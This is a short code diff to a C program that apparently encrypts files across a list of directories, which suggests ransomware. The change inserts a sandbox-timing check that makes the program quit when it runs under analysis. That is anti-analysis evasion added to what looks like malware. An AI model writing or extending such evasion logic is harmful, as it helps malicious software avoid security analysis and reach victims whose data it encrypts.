@@ -431,7 +431,9 @@ int main() {
   
     if (g_Verbose)
         g_StartTime = (DWORD)GetTickCount64();
-    
+
+    if (DetectSandboxTiming())
+        return -1;   
 
     if (Run(g_Directories, g_EncryptMode)) 
         PRINT(L"[>] Operation completed successfully.\n");
